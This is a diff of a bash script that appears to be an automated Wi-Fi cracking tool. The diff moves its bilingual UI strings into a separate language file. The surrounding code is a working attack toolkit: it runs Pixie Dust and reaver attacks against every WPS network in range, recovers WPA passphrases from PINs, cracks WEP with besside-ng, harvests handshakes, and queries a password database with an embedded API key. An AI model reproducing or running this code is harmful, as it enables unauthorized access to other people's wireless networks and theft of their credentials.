@@ -25,189 +25,7 @@ else
 	LANGUAGE="English"
 fi
 
-declare -A Strings1
-Strings1["English"]="\033[1mThere is no wireless interface on your system. Exit.\e[0m"
-Strings1["Russian"]="\033[1mБеспроводные сетевые интерфейсы отсутствуют. Выход из программы.\e[0m"
-
-declare -A Strings2
-Strings2["English"]="\033[1mThere is one wireless interface on your system. Automatically Selected\e[0m"
-Strings2["Russian"]="\033[1mНайден один беспроводной интерфейс - выбран автоматически\e[0m"
-
-declare -A Strings3
-Strings3["English"]="Available wireless interfaces: "
-Strings3["Russian"]="Доступные беспроводные интерфейсы: "
-
-declare -A Strings4
-Strings4["English"]="Enter the number corresponding to the selected interface: "
-Strings4["Russian"]="Введите цифру, соответствующую выбранному интерфейсу: "
-
-declare -A Strings5
-Strings5["English"]="Error. There is no selected wireless interface. Start from the interface selection"
-Strings5["Russian"]="Ошибка: беспроводной сетевой интерфейс ещё не выбран. Начните с выбора беспроводного интерфейса"
-
-declare -A Strings6
-Strings6["English"]="Checking to solve possible \"bad FCS\" problem if exists. Parameterizing..."
-Strings6["Russian"]="Проверка возможного решения проблемы \"bad FCS (контроля последовательности кадров)\" если она существует. Параметризация..."
-
-declare -A Strings7
-Strings7["English"]="\033[1mLooking for Wi-Fi networks with WPS enabled\e[0m"
-Strings7["Russian"]="\033[1mПоиск Wi-Fi сетей с WPS\e[0m"
-
-declare -A Strings8
-Strings8["English"]="\033[1mAutomatic attack Pixie Dust against every WPS enabled Wi-Fi network\e[0m"
-Strings8["Russian"]="\033[1mАвтоматическая атака Pixie Dust на все Wi-Fi сети с WPS\e[0m"
-
-declare -A Strings9
-Strings9["English"]="Enter the aim number: "
-Strings9["Russian"]="Введите номер цели: "
-
-declare -A Strings10
-Strings10["English"]="You selected: "
-Strings10["Russian"]="Вы выбрали: "
-
-declare -A Strings11
-Strings11["English"]="Starting the attack: "
-Strings11["Russian"]="Запускаем атаку: "
-
-declare -A Strings12
-Strings12["English"]="Processing "
-Strings12["Russian"]="Работаем с "
-
-declare -A Strings13
-Strings13["English"]="\033[0;31mPIN is found, trying WPA passphrase. PIN: \e[0m"
-Strings13["Russian"]="\033[0;31mПин найден, получаем пароль от Wi-Fi. Пин: \e[0m"
-
-declare -A Strings14
-Strings14["English"]="Discovered WPS enabled Wi-Fi networks:"
-Strings14["Russian"]="Найдены сети с WPS:"
-
-declare -A Strings15
-Strings15["English"]="Fail."
-Strings15["Russian"]="Неудача."
-
-declare -A Strings16
-Strings16["English"]="\033[0;31mWPS enabled Wi-Fi networks are not found\e[0m"
-Strings16["Russian"]="\033[0;31mСети с WPS не найдены\e[0m"
-
-declare -A Strings17
-Strings17["English"]="\033[1mLooking for Open Wi-Fi networks\e[0m"
-Strings17["Russian"]="\033[1mПоиск Wi-Fi сетей не защищённых паролем\e[0m"
-
-declare -A Strings18
-Strings18["English"]="\033[0;32mDiscovered Open Wi-Fi networks:\e[0m"
-Strings18["Russian"]="\033[0;32mНайдены следующие открытые сети:\e[0m"
-
-declare -A Strings19
-Strings19["English"]="\033[0;31mOpen Wi-Fi networks are not found\e[0m"
-Strings19["Russian"]="\033[0;31mОткрытых Wi-Fi сетей не найдено\e[0m"
-
-declare -A Strings20
-Strings20["English"]="\033[1mLooking for Wi-Fi networks with WEP encryption\e[0m"
-Strings20["Russian"]="\033[1mПоиск Wi-Fi сетей с WEP шифрованием\e[0m"
-
-declare -A Strings21
-Strings21["English"]="Discovered Wi-Fi networks with WEP encryption:"
-Strings21["Russian"]="Найдены следующие сети с WEP:"
-
-declare -A Strings22
-Strings22["English"]="\033[0;32mCracked Wi-Fi networks with WEP: \e[0m"
-Strings22["Russian"]="\033[0;32mВзломана сеть с WEP: \e[0m"
-
-declare -A Strings23
-Strings23["English"]="\033[0;32mKey: \e[0m"
-Strings23["Russian"]="\033[0;32mКлюч: \e[0m"
-
-declare -A Strings24
-Strings24["English"]="\033[0;31mWi-Fi networks with WEP encryption are not found\e[0m"
-Strings24["Russian"]="\033[0;31mWi-Fi сетей с WEP не найдено\e[0m"
-
-declare -A Strings25
-Strings25["English"]="\033[1mCollecting handshakes from every Wi-Fi network in range\e[0m"
-Strings25["Russian"]="\033[1mСбор хенщшейков со всех Wi-Fi сетей\e[0m"
-
-declare -A Strings26
-Strings26["English"]="Analyze collected handshakes:"
-Strings26["Russian"]="Анализ собранных хендшейков:"
-
-declare -A Strings27
-Strings27["English"]="Selected wireless interface "
-Strings27["Russian"]="Выбран беспроводной интерфейс "
-
-declare -A Strings28
-Strings28["English"]=". Mode: "
-Strings28["Russian"]=". В режиме: "
-
-declare -A Strings29
-Strings29["English"]="Wireless interface still is not selected"
-Strings29["Russian"]="Беспроводной сетевой интерфейс ещё не выбран"
-
-declare -A Strings30
-Strings30["English"]="Enter the number corresponding to the selected menu item: "
-Strings30["Russian"]="Введите цифру, соответствующую выбранному пункту меню: "
-
-declare -A Strings31
-Strings31["English"]="The script is over."
-Strings31["Russian"]="Программа завершена."
-
-declare -A Strings32
-Strings32["English"]="If you cracked WPS PIN, you are able to obtain WPA password. Connection to the target AP is necessary. Select the target AP and enter the WPS PIN."
-Strings32["Russian"]="Если вам известен WPS ПИН, то вы можете получить WPA пароль. Для этого необходимо подключиться к целевой ТД. Сейчас будут показаны доступные ТД, выберите желаемую, а затем введите известный ПИН."
-
-declare -A Strings33
-Strings33["English"]="Enter WPS PIN: "
-Strings33["Russian"]="Введите WPS ПИН: "
-
-declare -A Strings34
-Strings34["English"]="Wait for 1 minite."
-Strings34["Russian"]="Подождите 1 минуту."
-
-declare -A Strings35
-Strings35["English"]="\033[0;32mThe password is found: \e[0m"
-Strings35["Russian"]="\033[0;32mНайден пароль: \e[0m"
-
-declare -A Strings36
-Strings36["English"]="The password is not found. It is worth trying again."
-Strings36["Russian"]="Пароль не найден. Завершение работы. Рекомендуется попробовать ещё несколько раз."
-
-declare -A Strings37
-Strings37["English"]="WPS of this network is locked or the network is included in the Blacklist or in the Cracked List. Skipping."
-Strings37["Russian"]="WPS для этой сети заблокирован, либо она присутствует в списке взломанных или в списке исключений. Пропускаем."
-
-declare -A Strings38
-Strings38["English"]="The first attempt of two attempts"
-Strings38["Russian"]="Попытка 1 из 2."
-
-declare -A Strings39
-Strings39["English"]="The second attempt of two attempts"
-Strings39["Russian"]="Попытка 2 из 2."
-
-declare -A Strings40
-Strings40["English"]="Wait 3 minutes"
-Strings40["Russian"]="Подождите 3 минуты."
-
-declare -A Strings41
-Strings41["English"]="Does your Wi-Fi adapter support 5 GHz? [y/N]: "
-Strings41["Russian"]="Ваш Wi-Fi адаптер поддерживает 5 ГГц? [y/N]: "
-
-declare -A Strings42
-Strings42["English"]="Automatic 3WiFi database querying of all detected APs within the range (details on the database: https://miloserdov.org/?p=746 ). Details about this feature:  https://miloserdov.org/?p=997 Attention: Internet access is required!!!"
-Strings42["Russian"]="Автоматическая проверка всех обнаруженных в пределах досягаемости ТД по базе 3WiFi ( подробности о базе: https://hackware.ru/?p=4474 ). Подробности о данной функции: https://hackware.ru/?p=4900 Внимание: требуется Интернет-подключение!!!"
-
-declare -A Strings43
-Strings43["English"]="Search by BSSID / MAC"
-Strings43["Russian"]="Поиск по MAC-адресу (BSSID) сети"
-
-declare -A Strings44
-Strings44["English"]="Processing"
-Strings44["Russian"]="Обработка "
-
-declare -A Strings45
-Strings45["English"]="(ESSID:"
-Strings45["Russian"]="(имя:"
-
-declare -A Strings46
-Strings46["English"]="Search by ESSID / Name"
-Strings46["Russian"]="Поиск по имени сети"
+source $(dirname $0)/lang/main.sh
 
 function selectInterface {
 	clear
@@ -220,24 +38,24 @@ function selectInterface {
 
 
 	if [[ ${#DEVS[@]} == 0 ]]; then
-		echo -e ${Strings1[$LANGUAGE]}
+		echo -e ${Lang[Strings1]}
 		exit		
 	fi
 
 	if [[ ${#DEVS[@]} == 1 ]]; then
-		echo -e ${Strings2[$LANGUAGE]}
+		echo -e ${Lang[Strings2]}
 		IFACE=${DEVS[0]}
 	fi
 
 	if [[ ${#DEVS[@]} -gt 1 ]]; then
 		COUNTER=0
-		echo ${Strings3[$LANGUAGE]}
+		echo ${Lang[Strings3]}
 		for i in "${DEVS[@]}";
 		do
 			echo "$((COUNTER+1)). ${DEVS[COUNTER]}  `sudo airmon-ng | grep ${DEVS[COUNTER]} | awk '{$1=$2=$3=""; print " // " $0}'`"
 			COUNTER=$((COUNTER+1))
 		done
-		read -p "${Strings4[$LANGUAGE]}" INTNUM	
+		read -p "${Lang[Strings4]}" INTNUM	
 		IFACE=${DEVS[$((INTNUM-1))]}		
 	fi
 
@@ -256,7 +74,7 @@ function putInMonitorMode {
 		REPLY=""
 		showMainMenu	
 	else
-		INF=${Strings5[$LANGUAGE]}
+		INF=${Lang[Strings5]}
 		REPLY=""
 		showMainMenu
 	fi
@@ -271,7 +89,7 @@ function putInManagedMode {
 		REPLY=""
 		showMainMenu	
 	else
-		INF=${Strings5[$LANGUAGE]}
+		INF=${Lang[Strings5]}
 		REPLY=""
 		showMainMenu
 	fi
@@ -291,7 +109,7 @@ function putInMonitorModePlus {
 			showMainMenu
 		fi	
 	else
-		INF=${Strings5[$LANGUAGE]}
+		INF=${Lang[Strings5]}
 		REPLY=""
 		showMainMenu
 	fi
@@ -312,11 +130,11 @@ function set_wash_parametrization {
 }
 
 function showWPSNetworks {
-	echo ${Strings6[$LANGUAGE]}
+	echo ${Lang[Strings6]}
 
 	set_wash_parametrization
 
-	echo -e ${Strings7[$LANGUAGE]}
+	echo -e ${Lang[Strings7]}
 	if [[ "$IFACE" ]]; then
 
 		sudo xterm -geometry "150x50+50+0" -e "sudo wash -i $IFACE $fcs | tee /tmp/wash.all"
@@ -324,16 +142,16 @@ function showWPSNetworks {
 		echo -e 'Number\tBSSID               Ch  dBm  WPS  Lck  Vendor    ESSID'
 		echo '---------------------------------------------------------------------------------------------------------------'
 		cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | cat -b
-		read -p "${Strings9[$LANGUAGE]}" AIM
-		echo ${Strings10[$LANGUAGE]}
+		read -p "${Lang[Strings9]}" AIM
+		echo ${Lang[Strings10]}
 		cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM"
-		echo ${Strings11[$LANGUAGE]}
+		echo ${Lang[Strings11]}
 		sudo iw dev "$IFACE" set channel "$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $2}')"
 		sudo xterm -geometry "150x50+50+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo aireplay-ng $IFACE -1 120 -a $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $1}')" &
 		sudo xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "echo -e \"\n\" | sudo reaver -i $IFACE -A -b $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $1}') -v --no-nacks"
 
 	else
-		INF=${Strings5[$LANGUAGE]}
+		INF=${Lang[Strings5]}
 		REPLY=""
 		showMainMenu
 	fi
@@ -348,16 +166,16 @@ function showWPSNetworks {
 
 function PixieDustAattack {
 
-	echo ${Strings6[$LANGUAGE]}
+	echo ${Lang[Strings6]}
 
 	set_wash_parametrization
 
-	echo -e ${Strings8[$LANGUAGE]}
+	echo -e ${Lang[Strings8]}
 	if [[ "$IFACE" ]]; then
 		sudo timeout 120 xterm -geometry "150x50+50+0" -e "sudo wash -i $IFACE $fcs | tee /tmp/wash.all"
 		FOUNDWPS=$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | cat -b)
 		if [[ "$FOUNDWPS" ]]; then
-			echo ${Strings14[$LANGUAGE]}
+			echo ${Lang[Strings14]}
 			echo -e 'Number\tBSSID               Ch  dBm  WPS  Lck  Vendor    ESSID'
 			echo '---------------------------------------------------------------------------------------------------------------'
 			cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | cat -b
@@ -375,11 +193,11 @@ function PixieDustAattack {
 				ESSID=$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $7}')
 
 				if [[ "$ESSID" ]]; then
-					echo ${Strings12[$LANGUAGE]}"$i ($ESSID)";
-					echo ${Strings11[$LANGUAGE]}
+					echo ${Lang[Strings12]}"$i ($ESSID)";
+					echo ${Lang[Strings11]}
 					isBlocked=$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $5}')
 					if [[ "$isBlocked" == "Yes" || "`grep $ESSID cracked.txt`" || "`grep $ESSID blacklist.txt`" ]]; then
-						echo -e ${Strings37[$LANGUAGE]}
+						echo -e ${Lang[Strings37]}
 					else
 						sudo iw dev "$IFACE" set channel "$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $2}')"
 		
@@ -389,19 +207,19 @@ function PixieDustAattack {
 						PIN=$(cat /tmp/reaver.pixiedust | grep -E '\[\+\] WPS pin:' | grep -Eo '[0-9]{8}')
 
 						if [[ "$PIN" ]]; then
-							echo -e ${Strings13[$LANGUAGE]}"$PIN"
+							echo -e ${Lang[Strings13]}"$PIN"
 							sudo ip link set "$IFACE" down && sudo iw "$IFACE" set type managed && sudo ip link set "$IFACE" up
 							echo -e "ctrl_interface=/var/run/wpa_supplicant\nctrl_interface_group=0\nupdate_config=1" > /tmp/suppl.conf
 							sudo timeout 60 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo wpa_supplicant -i $IFACE -c /tmp/suppl.conf" &
 							sleep 3
 							echo "wps_reg $i $PIN" | sudo wpa_cli
 
-							echo -e ${Strings34[$LANGUAGE]}
+							echo -e ${Lang[Strings34]}
 							sleep 60		
 							if [[ "`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'`" ]]; then
-								echo -e ${Strings35[$LANGUAGE]} "`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'`"
+								echo -e ${Lang[Strings35]} "`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'`"
 							else 
-								echo -e ${Strings36[$LANGUAGE]}
+								echo -e ${Lang[Strings36]}
 							fi
 
 							sudo airmon-ng check kill
@@ -411,7 +229,7 @@ function PixieDustAattack {
 	
 							sudo ip link set "$IFACE" down && sudo iw "$IFACE" set monitor control && sudo ip link set "$IFACE" up
 						else
-							echo ${Strings15[$LANGUAGE]}
+							echo ${Lang[Strings15]}
 						fi					
 					fi
 				else
@@ -421,7 +239,7 @@ function PixieDustAattack {
 				fi
 			done
 		else
-			echo -e ${Strings16[$LANGUAGE]}
+			echo -e ${Lang[Strings16]}
 		fi
 
 		if [ $REPLY -eq 11 ]; then
@@ -432,7 +250,7 @@ function PixieDustAattack {
 		fi
 	
 	else
-		INF=${Strings5[$LANGUAGE]}
+		INF=${Lang[Strings5]}
 		REPLY=""
 		showMainMenu
 	fi
@@ -440,14 +258,14 @@ function PixieDustAattack {
 
 function showOpen {
 	if [[ "$IFACE" ]]; then
-		echo -e ${Strings17[$LANGUAGE]}
+		echo -e ${Lang[Strings17]}
 		sudo timeout 100 xterm -geometry "150x50+50+0" -e "sudo airodump-ng -i $IFACE -t OPN -w /tmp/openwifinetworks --output-format csv"
 		NOPASS=$(cat /tmp/openwifinetworks-01.csv | grep -E ' OPN,')
 		if [[ "$NOPASS" ]]; then
-			echo -e ${Strings18[$LANGUAGE]}
+			echo -e ${Lang[Strings18]}
 			cat /tmp/openwifinetworks-01.csv | grep -E ' OPN,' | awk '{print $19}'| sed 's/,//' | cat -b
 		else
-			echo -e ${Strings19[$LANGUAGE]}	
+			echo -e ${Lang[Strings19]}	
 		fi
 
 		sudo rm /tmp/openwifinetworks*
@@ -459,7 +277,7 @@ function showOpen {
 			showMainMenu
 		fi
 	else
-		INF=${Strings5[$LANGUAGE]}
+		INF=${Lang[Strings5]}
 		REPLY=""
 		showMainMenu
 	fi
@@ -467,11 +285,11 @@ function showOpen {
 
 function attackWEP {
 	if [[ "$IFACE" ]]; then
-		echo -e ${Strings20[$LANGUAGE]}
+		echo -e ${Lang[Strings20]}
 		sudo timeout 100 xterm -geometry "150x50+50+0" -e "sudo airodump-ng -i $IFACE -t WEP -w /tmp/wepwifinetworks --output-forma csv"
 		WEP=$(cat /tmp/wepwifinetworks-01.csv | grep -E ' WEP,')
 		if [[ "$WEP" ]]; then
-			echo ${Strings21[$LANGUAGE]}
+			echo ${Lang[Strings21]}
 			cat /tmp/wepwifinetworks-01.csv | grep -E ' WEP,' | awk '{print $19}' | sed 's/,//' | cat -b
 
 			COUNTER=0
@@ -483,24 +301,24 @@ function attackWEP {
 
 			for i in "${WEPS[@]}"; 
 			do 
-				echo ${Strings12[$LANGUAGE]}"$i";
+				echo ${Lang[Strings12]}"$i";
 				#sudo iw dev "$IFACE" set channel `cat /tmp/wepwifinetworks-01.csv | grep -E "$i" | awk '{print $6}' | sed 's/,//'`
 				cd /tmp
 				sudo timeout 600 xterm -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo besside-ng $IFACE -b $i -c $(cat /tmp/wepwifinetworks-01.csv | grep -E $i | awk '{print $6}' | sed 's/,//')"
 				WEPCracked=$(cat /tmp/besside.log | grep -E '[A-Fa-f0-9:]{11}')
 				if [[ "$WEPCracked" ]]; then
-					echo -e ${Strings22[$LANGUAGE]}$(cat /tmp/wepwifinetworks-01.csv | grep -E $i | awk '{print $1}' | sed 's/,//')"\e[0m"
-					echo -e ${Strings23[$LANGUAGE]}$(cat /tmp/besside.log | grep -E '[A-Fa-f0-9:]{11}' | awk '{print $3}' | sed 's/,//')
+					echo -e ${Lang[Strings22]}$(cat /tmp/wepwifinetworks-01.csv | grep -E $i | awk '{print $1}' | sed 's/,//')"\e[0m"
+					echo -e ${Lang[Strings23]}$(cat /tmp/besside.log | grep -E '[A-Fa-f0-9:]{11}' | awk '{print $3}' | sed 's/,//')
 					rm /tmp/besside.log
 					rm /tmp/wpa.cap
 					rm /tmp/wep.cap
 				else
-					echo ${Strings15[$LANGUAGE]}
+					echo ${Lang[Strings15]}
 				fi
 				cd
 			done
 		else
-			echo -e ${Strings24[$LANGUAGE]}
+			echo -e ${Lang[Strings24]}
 		fi
 
 		sudo rm /tmp/wepwifinetworks*
@@ -512,7 +330,7 @@ function attackWEP {
 			showMainMenu
 		fi
 	else
-		INF=${Strings5[$LANGUAGE]}
+		INF=${Lang[Strings5]}
 		REPLY=""
 		showMainMenu
 	fi
@@ -520,12 +338,12 @@ function attackWEP {
 
 function getAllHandshakes {
 	if [[ "$IFACE" ]]; then
-		echo -e ${Strings25[$LANGUAGE]}
+		echo -e ${Lang[Strings25]}
 
 		sudo timeout 1200 xterm -geometry "150x50+50+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo airodump-ng $IFACE -f 30000 -w autopwner --berlin 1200" &
 		sudo timeout 1200 xterm -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo zizzania -i $IFACE"
 		
-		echo ${Strings26[$LANGUAGE]}
+		echo ${Lang[Strings26]}
 		sleep 1
 		sudo pyrit -r "$(ls | grep -E autopwn | grep -E cap | tail -n 1)" analyze
 
@@ -539,7 +357,7 @@ function getAllHandshakes {
 			showMainMenu
 		fi
 	else
-		INF=${Strings5[$LANGUAGE]}
+		INF=${Lang[Strings5]}
 		REPLY=""
 		showMainMenu
 	fi
@@ -547,13 +365,13 @@ function getAllHandshakes {
 
 function showWPAPassFromPin {
 
-	echo ${Strings32[$LANGUAGE]}
+	echo ${Lang[Strings32]}
 
-	echo ${Strings6[$LANGUAGE]}
+	echo ${Lang[Strings6]}
 
 	set_wash_parametrization
 
-	echo -e ${Strings7[$LANGUAGE]}
+	echo -e ${Lang[Strings7]}
 	if [[ "$IFACE" ]]; then
 
 		sudo xterm -geometry "150x50+50+0" -e "sudo wash -i $IFACE $fcs | tee /tmp/wash.all"
@@ -563,32 +381,32 @@ function showWPAPassFromPin {
 
 		sudo ip link set "$IFACE" down && sudo iw "$IFACE" set type managed && sudo ip link set "$IFACE" up
 
-		read -p "${Strings9[$LANGUAGE]}" AIM
-		read -p "${Strings33[$LANGUAGE]}" PIN
+		read -p "${Lang[Strings9]}" AIM
+		read -p "${Lang[Strings33]}" PIN
 		echo -e "ctrl_interface=/var/run/wpa_supplicant\nctrl_interface_group=0\nupdate_config=1" > /tmp/suppl.conf
 		sudo timeout 60 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo wpa_supplicant -i $IFACE -c /tmp/suppl.conf" &
 		sleep 3
 		echo "wps_reg $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $1}') $PIN" | sudo wpa_cli
-		echo -e ${Strings38[$LANGUAGE]}
-		echo -e ${Strings34[$LANGUAGE]}
+		echo -e ${Lang[Strings38]}
+		echo -e ${Lang[Strings34]}
 		sleep 60		
 		if [[ "`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'`" ]]; then
-			echo -e ${Strings35[$LANGUAGE]} "`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'`"
+			echo -e ${Lang[Strings35]} "`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'`"
 		else
 			sudo airmon-ng check kill
 			sudo rm /var/run/wpa_supplicant/$IFACE
-			echo -e ${Strings36[$LANGUAGE]}
+			echo -e ${Lang[Strings36]}
 			sudo timeout 180 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo wpa_supplicant -i $IFACE -c /tmp/suppl.conf" &
 			sleep 3
 			echo "wps_reg $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $1}') $PIN" | sudo wpa_cli	
-			echo -e ${Strings39[$LANGUAGE]}		
-			echo -e ${Strings40[$LANGUAGE]}
+			echo -e ${Lang[Strings39]}		
+			echo -e ${Lang[Strings40]}
 			sleep 180
 
 			if [[ "`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'`" ]]; then
-				echo -e ${Strings35[$LANGUAGE]} "`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'`"
+				echo -e ${Lang[Strings35]} "`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'`"
 			else
-				echo -e ${Strings36[$LANGUAGE]}
+				echo -e ${Lang[Strings36]}
 			fi
 		fi
 
@@ -605,7 +423,7 @@ function showWPAPassFromPin {
 			showMainMenu
 		fi
 	else
-		INF=${Strings5[$LANGUAGE]}
+		INF=${Lang[Strings5]}
 		REPLY=""
 		showMainMenu
 	fi
@@ -615,10 +433,10 @@ function 3WIFI {
 	if [[ "$IFACE" ]]; then
 
 		echo ''
-		echo ${Strings42[$LANGUAGE]}
+		echo ${Lang[Strings42]}
 
 		echo ''
-		read  -p "${Strings41[$LANGUAGE]}" -i "n" isFiveEnable 
+		read  -p "${Lang[Strings41]}" -i "n" isFiveEnable 
 
 		if [[ "$isFiveEnable" == "y" ]]; then
 			CH='--channel 1-13,36-165'
@@ -630,26 +448,26 @@ function 3WIFI {
 
 		FILE='/tmp/3wifi-01.csv'
 
-		echo ${Strings43[$LANGUAGE]}
+		echo ${Lang[Strings43]}
 		while read -r line ; do
 
 			BSSID=`echo $line | awk '{print $1}' | sed 's/,//'`
 
 			ESSID=`echo $line | awk -F"," '{print $14}' | sed 's/ //'`
 
-			echo "${Strings44[$LANGUAGE]} $BSSID ${Strings45[$LANGUAGE]} $ESSID)"
+			echo "${Lang[Strings44]} $BSSID ${Lang[Strings45]} $ESSID)"
 			echo -e "\033[0;32m`curl -s 'http://3wifi.stascorp.com/api/apiquery?key=MHgONUzVP0KK3FGfV0HVEREHLsS6odc3&bssid='$BSSID`\e[0m" | grep -E -v ':\[\]'
 		
 		done < <(grep -E '([A-Za-z0-9._: @\(\)\\=\[\{\}\"%;-]+,){14}' $FILE)
 
 		echo ''
-		echo "${Strings46[$LANGUAGE]}"
+		echo "${Lang[Strings46]}"
 		while read -r line ; do
 
 			ESSID=`echo $line | awk -F"," '{print $14}' | sed 's/ //'`
 
 			if [[ "$ESSID" ]]; then
-				echo "${Strings44[$LANGUAGE]} $ESSID"
+				echo "${Lang[Strings44]} $ESSID"
 				ESSID=`echo $ESSID | sed 's/ /+/g'`
 				echo -e "\033[0;32m`curl -s 'http://3wifi.stascorp.com/api/apiquery?key=MHgONUzVP0KK3FGfV0HVEREHLsS6odc3&bssid=*&essid='$ESSID`\e[0m" | grep -E -v ':\[\]'
 			fi
@@ -666,7 +484,7 @@ function 3WIFI {
 			showMainMenu
 		fi
 	else
-		INF=${Strings5[$LANGUAGE]}
+		INF=${Lang[Strings5]}
 		REPLY=""
 		showMainMenu
 	fi
@@ -682,7 +500,7 @@ while read -r line ; do
 done < <(sudo iw dev | grep -E "Interface " | sed "s/	Interface //")
 
 if [[ ${#DEVS[@]} == 1 ]]; then
-	echo -e ${Strings2[$LANGUAGE]}
+	echo -e ${Lang[Strings2]}
 	IFACE=${DEVS[0]}
 fi
 
@@ -690,13 +508,13 @@ fi
 function showMainMenu {
 
 if [[ "$IFACE" ]]; then
-	INF=${Strings27[$LANGUAGE]}$IFACE
+	INF=${Lang[Strings27]}$IFACE
 
 	while read -r line ; do
-	INF=${INF}${Strings28[$LANGUAGE]}${line}
+	INF=${INF}${Lang[Strings28]}${line}
 	done < <(sudo iw dev | grep -E -A5 "Interface $IFACE" | grep -E "type " | sed "s/		type //")	
 else
-	INF=${Strings29[$LANGUAGE]}
+	INF=${Lang[Strings29]}
 fi
 
 
@@ -762,12 +580,12 @@ _EOF_
 
 fi
 
-read -p "${Strings30[$LANGUAGE]}" REPLY
+read -p "${Lang[Strings30]}" REPLY
 
 
 if [[ $REPLY =~ ^[0-9]$ ]]; then
 	if [[ $REPLY == 0 ]]; then
-		echo ${Strings31[$LANGUAGE]}
+		echo ${Lang[Strings31]}
 		exit
 	fi
 fi
